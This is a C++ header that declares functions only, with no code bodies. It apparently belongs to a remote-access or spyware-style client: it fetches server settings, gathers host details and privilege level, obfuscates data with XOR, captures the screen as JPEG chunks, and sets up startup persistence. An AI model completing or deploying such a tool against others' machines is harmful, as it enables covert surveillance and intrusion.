#pragma once
#include <string>
#include <time.h>
#include "json.hpp"
#include <random>
#include <unistd.h>
#include <ctime>
#include <cmath>
#include <list>
#include <cwchar>


using namespace nlohmann;
using namespace std;

extern const string DEC_ASCII;


string operator * (string a, int b);


string random_ascii(int lng, string payload = "");

std::string rJsonQuots(const std::string& input);

json get_setting_from_server();

string get_public_ip();

string pGetlogin();

string t_gethostname();

bool is_elevated_access();

string get_platform_name();


class B2Hex {

public:
	static string a2b_hex(const string&);

	static string b2a_hex(const string&);
};


char* x0r(string key, char* value, size_t x0rlen);

pair<json, char*> GetBlockPacket(char* packet, size_t lpacket, bool ignore = true);

char* SetBlockPacket(json info, char* binary, size_t lbinary, size_t&size_packet);

char* subchar(char* memb, unsigned int start, unsigned int stop, size_t ln);

list<pair<unsigned int, char*>> split42chars(char* memb, const char* delimiter, size_t l);

char* concatenate3chars_proto(const char* _json, const char* binary, size_t, size_t);

char* concatenate_to_char_ptr(list<pair<size_t, char*>>& binary, size_t lvector, bool deallocate=true);

void deallocate_receive_proto(list<pair<size_t, char*>>&packet);

pair<size_t, list<pair<size_t, char*>>> set_X_parts_image(map<string, pair<size_t, char*>>&, int quality=50, int xb=3, int w=1980, int h=1080);

pair<size_t, char*> get_img_24_bit_jpg(int w, int h, int quality = 50, bool v = false, int l=0, int t=0, int r=0, int b=0);

pair<char*, char*> get_tempfile();

unsigned int set_startup_peep();

bool is_set_startup();

int getPeepName(wchar_t* tn);

int kill_peep();